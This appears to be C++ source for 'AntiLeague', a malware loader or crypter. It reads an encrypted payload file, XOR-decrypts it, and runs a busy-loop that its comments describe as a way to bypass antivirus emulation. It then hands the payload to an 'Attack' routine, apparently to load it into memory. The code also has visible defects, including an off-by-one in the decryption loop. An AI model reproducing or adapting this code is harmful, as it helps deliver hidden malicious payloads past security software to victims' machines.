#include <fstream>
#include "MemoryModule.h"
#include "c_AntiLeague.h"

void c_AntiLeague::cipher()
{
    if (dec_key.empty())
    {
        MessageBox(NULL, L"Decryption Key Empty", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        std::exit(1);
    }

    for (size_t i = 0; i <= payload.size(); i++)
        payload[i] ^= dec_key[i % dec_key.size()];
}

void c_AntiLeague::gen_dec_key()
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < 10; ++i)
        dec_key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
}

void c_AntiLeague::Init()
{
    std::string _payload = getPayload();
    std::ifstream infile(_payload, std::ios::binary);

    if (!infile.good())
    {
        MessageBox(NULL, L"Can't Open Payload", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        std::exit(1);
    }

    OVERLAPPED Overlapped = { NULL };
    HANDLE hPayloadFile = CreateFileA(_payload.c_str(), GENERIC_ALL, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    LockFileEx(hPayloadFile, NULL, NULL, MAXDWORD, MAXDWORD, &Overlapped);

    std::string payloadData((std::istreambuf_iterator<char>(infile)), (std::istreambuf_iterator<char>()));
    infile.close();

    if (payloadData.empty())
    {
        MessageBox(NULL, L"Payload Empty", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        std::exit(1);
    }

    payload = std::move(payloadData);

    // Apparently this method below has been shown to bypass AV emulation.
    // Granted this information was from 2014, it doesn't hurt to include it. 
    // Source: https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
    // Also, this shouldn't even be ran in the emulator since the payload
    // (there is a payload existence check in the getPayload function) is 
    // an external encrypted file with no extension. I'm assuming that it 
    // will not likely be included in the emulation for such reason. 

    int count = 0;

    for (int i = 0; i < 100000000; i++)
        count++;

    if (count == 100000000)
        Attack<InitProc>(InitProc(), "Init", &_payload);
}